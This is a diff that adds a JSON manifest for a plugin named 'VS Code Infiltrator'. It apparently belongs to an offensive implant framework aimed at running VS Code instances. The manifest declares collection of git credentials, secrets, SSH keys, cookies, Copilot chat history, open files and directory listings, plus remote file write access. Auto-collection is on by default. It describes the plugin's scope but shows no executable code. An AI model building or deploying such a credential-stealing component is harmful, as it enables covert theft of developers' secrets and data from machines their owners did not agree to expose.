@@ -1,0 +1,73 @@
+{
+  "id": "vscode",
+  "name": "VS Code Infiltrator",
+  "version": "1.0.0",
+  "description": "Extracts project data, open files, git credentials, Copilot chat history, and provides file read/write access from a tapped VS Code instance.",
+  "author": "operator",
+  "targetApps": ["code", "Code"],
+  "capabilities": {
+    "mainProcess": true,
+    "renderer": false,
+    "ui": true
+  },
+  "dataTypes": [
+    {
+      "name": "project_info",
+      "label": "Project Info",
+      "fields": ["workspacePath", "openEditors", "recentProjects", "extensions", "fileTree"]
+    },
+    {
+      "name": "file_content",
+      "label": "File Content",
+      "fields": ["filePath", "content", "size"]
+    },
+    {
+      "name": "write_result",
+      "label": "Write Result",
+      "fields": ["filePath", "success", "error"]
+    },
+    {
+      "name": "git_info",
+      "label": "Git Info",
+      "fields": ["remotes", "log", "userName", "userEmail", "credentialHelper", "branch"]
+    },
+    {
+      "name": "secrets",
+      "label": "Secrets",
+      "fields": ["source", "entries"]
+    },
+    {
+      "name": "ssh_keys",
+      "label": "SSH Keys",
+      "fields": ["keys"]
+    },
+    {
+      "name": "cookies",
+      "label": "Cookies",
+      "fields": ["cookies"]
+    },
+    {
+      "name": "chat_sessions",
+      "label": "Chat Sessions",
+      "fields": ["sessions"]
+    },
+    {
+      "name": "chat_history",
+      "label": "Chat History",
+      "fields": ["sessionFile", "title", "messages"]
+    },
+    {
+      "name": "dir_listing",
+      "label": "Directory Listing",
+      "fields": ["dirPath", "entries"]
+    }
+  ],
+  "settings": [
+    {
+      "key": "autoCollect",
+      "label": "Auto-collect project info on load (1=yes, 0=no)",
+      "type": "number",
+      "default": 1
+    }
+  ]
+}
